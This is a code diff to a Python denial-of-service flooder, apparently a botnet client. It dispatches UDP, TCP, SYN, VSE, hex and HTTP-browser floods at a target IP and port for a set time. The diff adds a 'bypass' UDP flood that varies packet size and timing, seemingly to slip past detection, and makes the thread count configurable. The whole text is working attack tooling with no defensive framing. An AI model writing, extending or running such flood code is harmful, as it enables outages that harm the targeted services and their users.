@@ -60,6 +60,23 @@ def attack_hex(ip, port, secs):
     while time.time() < secs:
         s.sendto(payload, (ip, port))
 
+
+def attack_udp_bypass(ip, port, secs):
+    PACKET_SIZES = [64, 128, 256, 512, 1024]
+    DELAY_RANGE = (0.05, 0.2)
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while time.time() < secs:
+        try:
+            packet_size = random.choice(PACKET_SIZES) 
+            packet = random._urandom(packet_size)
+            sock.sendto(packet, (ip, port))
+            delay = random.uniform(*DELAY_RANGE)
+            time.sleep(delay)
+        except:
+            print('error')
+        print('attack sended')
 def attack_udp(ip, port, secs):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     data = random._urandom(1024)
@@ -133,7 +150,6 @@ def attack_browser(ip, port, secs):
                        f'Pragma: no-cache\r\n\r\n')
             
             s.sendall(request.encode())
-            response = s.recv(4096)
             
         except Exception as e:
             pass
@@ -144,6 +160,7 @@ def lunch_attack(method, ip, port, secs):
     methods = {
         '.HEX': attack_hex,
         '.UDP': attack_udp,
+        '.UDPB': attack_udp_bypass,
         '.TCP': attack_tcp,
         '.SYN': attack_syn,
         '.VSE': attack_vse,
@@ -197,9 +214,12 @@ def main():
                 ip = args[1]
                 port = int(args[2])
                 secs = time.time() + int(args[3])
+                threads = int(args[4])
 
-                for _ in range(4):
+                for _ in range(threads):
                     threading.Thread(target=lunch_attack, args=(method, ip, port, secs), daemon=True).start()
+
+                print(f'{method}, {ip}, {port}, {secs}')
         except:
             break
 
